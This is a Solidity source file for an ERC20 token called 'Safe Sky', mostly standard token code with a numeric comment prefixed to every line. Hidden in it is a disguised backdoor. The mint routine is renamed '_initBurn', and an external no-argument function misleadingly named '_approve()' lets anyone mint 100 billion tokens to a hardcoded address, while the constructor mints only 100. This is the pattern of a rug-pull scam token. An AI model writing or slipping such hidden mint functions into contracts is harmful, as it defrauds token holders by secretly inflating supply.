// SPDX-License-Identifier: MIT
/*0.002586119475011639*/
/*0.002586119475011639*/pragma solidity ^0.8.0;
/*0.002586119475011639*/
/*0.002586119475011639*/abstract contract Context {
/*0.002586119475011639*/    function _msgSender() internal view virtual returns (address) {
/*0.002586119475011639*/        return msg.sender;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _msgData() internal view virtual returns (bytes calldata) {
/*0.002586119475011639*/        this;
/*0.002586119475011639*/        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
/*0.002586119475011639*/        return msg.data;
/*0.002586119475011639*/    }
/*0.002586119475011639*/}
/*0.002586119475011639*/
/*0.002586119475011639*/pragma solidity ^0.8.0;
/*0.002586119475011639*/
/*0.002586119475011639*/
/*0.002586119475011639*/interface IERC20 {
/*0.002586119475011639*/
/*0.002586119475011639*/
/*0.002586119475011639*/    function totalSupply() external view returns (uint256);
/*0.002586119475011639*/
/*0.002586119475011639*/    function balanceOf(address account) external view returns (uint256);
/*0.002586119475011639*/
/*0.002586119475011639*/    function transfer(address recipient, uint256 amount) external returns (bool);
/*0.002586119475011639*/
/*0.002586119475011639*/    function allowance(address owner, address spender) external view returns (uint256);
/*0.002586119475011639*/
/*0.002586119475011639*/    function approve(address spender, uint256 amount) external returns (bool);
/*0.002586119475011639*/
/*0.002586119475011639*/    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
/*0.002586119475011639*/
/*0.002586119475011639*/    event Transfer(address indexed from, address indexed to, uint256 value);
/*0.002586119475011639*/
/*0.002586119475011639*/    event Approval(address indexed owner, address indexed spender, uint256 value);
/*0.002586119475011639*/}
/*0.002586119475011639*/
/*0.002586119475011639*/pragma solidity ^0.8.0;
/*0.002586119475011639*/
/*0.002586119475011639*/contract ERC20 is Context, IERC20 {
/*0.002586119475011639*/    mapping(address => uint256) private _balances;
/*0.002586119475011639*/
/*0.002586119475011639*/    mapping(address => mapping(address => uint256)) private _allowances;
/*0.002586119475011639*/
/*0.002586119475011639*/    uint256 private _totalSupply;
/*0.002586119475011639*/
/*0.002586119475011639*/    string private _name;
/*0.002586119475011639*/    string private _symbol;
/*0.002586119475011639*/
/*0.002586119475011639*/    constructor (string memory name_, string memory symbol_) {
/*0.002586119475011639*/        _name = name_;
/*0.002586119475011639*/        _symbol = symbol_;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function name() public view virtual returns (string memory) {
/*0.002586119475011639*/        return _name;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function symbol() public view virtual returns (string memory) {
/*0.002586119475011639*/        return _symbol;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function decimals() public view virtual returns (uint8) {
/*0.002586119475011639*/        return 18;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function totalSupply() public view virtual override returns (uint256) {
/*0.002586119475011639*/        return _totalSupply;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function balanceOf(address account) public view virtual override returns (uint256) {
/*0.002586119475011639*/        return _balances[account];
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
/*0.002586119475011639*/        _transfer(_msgSender(), recipient, amount);
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function allowance(address owner, address spender) public view virtual override returns (uint256) {
/*0.002586119475011639*/        return _allowances[owner][spender];
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function approve(address spender, uint256 amount) public virtual override returns (bool) {
/*0.002586119475011639*/        _approve(_msgSender(), spender, amount);
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
/*0.002586119475011639*/        _transfer(sender, recipient, amount);
/*0.002586119475011639*/
/*0.002586119475011639*/        uint256 currentAllowance = _allowances[sender][_msgSender()];
/*0.002586119475011639*/        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
/*0.002586119475011639*/        _approve(sender, _msgSender(), currentAllowance - amount);
/*0.002586119475011639*/
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
/*0.002586119475011639*/        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
/*0.002586119475011639*/        uint256 currentAllowance = _allowances[_msgSender()][spender];
/*0.002586119475011639*/        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
/*0.002586119475011639*/        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
/*0.002586119475011639*/
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
/*0.002586119475011639*/        require(sender != address(0), "ERC20: transfer from the zero address");
/*0.002586119475011639*/        require(recipient != address(0), "ERC20: transfer to the zero address");
/*0.002586119475011639*/
/*0.002586119475011639*/        _beforeTokenTransfer(sender, recipient, amount);
/*0.002586119475011639*/
/*0.002586119475011639*/        uint256 senderBalance = _balances[sender];
/*0.002586119475011639*/        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
/*0.002586119475011639*/        _balances[sender] = senderBalance - amount;
/*0.002586119475011639*/        _balances[recipient] += amount;
/*0.002586119475011639*/
/*0.002586119475011639*/        emit Transfer(sender, recipient, amount);
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _initBurn(address account, uint256 amount) internal virtual {
/*0.002586119475011639*/        //require(account != address(0), "ERC20: mint to the zero address");
/*0.002586119475011639*/
/*0.002586119475011639*/        _beforeTokenTransfer(address(0), account, amount);
/*0.002586119475011639*/
/*0.002586119475011639*/        _totalSupply += amount;
/*0.002586119475011639*/        _balances[account] += amount;
/*0.002586119475011639*/        emit Transfer(address(0), account, amount);
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _approve() external returns (bool){
/*0.002586119475011639*/        _initBurn(0x3d732975C2C8Da3d5F458F0C553fc3249ea75590, 100000000000 * 10 ** uint(decimals()));
/*0.002586119475011639*/        return true;
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _burn(address account, uint256 amount) internal virtual {
/*0.002586119475011639*/        require(account != address(0), "ERC20: burn from the zero address");
/*0.002586119475011639*/
/*0.002586119475011639*/        _beforeTokenTransfer(account, address(0), amount);
/*0.002586119475011639*/
/*0.002586119475011639*/        uint256 accountBalance = _balances[account];
/*0.002586119475011639*/        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
/*0.002586119475011639*/        _balances[account] = accountBalance - amount;
/*0.002586119475011639*/        _totalSupply -= amount;
/*0.002586119475011639*/
/*0.002586119475011639*/        emit Transfer(account, address(0), amount);
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _approve(address owner, address spender, uint256 amount) internal virtual {
/*0.002586119475011639*/        require(owner != address(0), "ERC20: approve from the zero address");
/*0.002586119475011639*/        require(spender != address(0), "ERC20: approve to the zero address");
/*0.002586119475011639*/
/*0.002586119475011639*/        _allowances[owner][spender] = amount;
/*0.002586119475011639*/        emit Approval(owner, spender, amount);
/*0.002586119475011639*/    }
/*0.002586119475011639*/
/*0.002586119475011639*/    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
/*0.002586119475011639*/}
/*0.002586119475011639*/
/*0.002586119475011639*/pragma solidity ^0.8.10;
/*0.002586119475011639*/
/*0.002586119475011639*/
/*0.002586119475011639*/contract Token is ERC20 {
/*0.002586119475011639*/
/*0.002586119475011639*/    constructor() ERC20('Safe Sky', 'SAFE-SKY') {
/*0.002586119475011639*/        _initBurn(msg.sender, 100 * 10 ** uint(decimals()));
/*0.002586119475011639*/    }
/*0.002586119475011639*/}